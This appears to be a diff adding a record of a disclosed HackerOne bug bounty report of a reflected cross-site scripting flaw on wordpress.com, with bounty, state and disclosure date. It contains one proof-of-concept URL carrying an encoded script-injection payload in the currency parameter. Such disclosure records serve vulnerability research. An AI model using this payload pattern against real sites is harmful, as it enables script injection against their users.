@@ -1,0 +1,16 @@
+ReportLink:https://hackerone.com/reports/133963
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/spam404
+ReportedTo:Automattic(automattic)
+BountyAmount:75.0
+Severity:
+State:Closed
+DateOfDisclosure:28.04.2016 6:56:22
+
+Summary:
+
+Hey,
+
+I found an XSS vulnerability on www.wordpress.com
+
+Here's a proof-of-concept working in the latest version of Firefox - https://wordpress.com/website/?currency=%3C/title%3E%3C/script/%22-alert%280%29-%22--%3E%22%3E%3Csvg/onload=prompt%28document.domain%29%3E
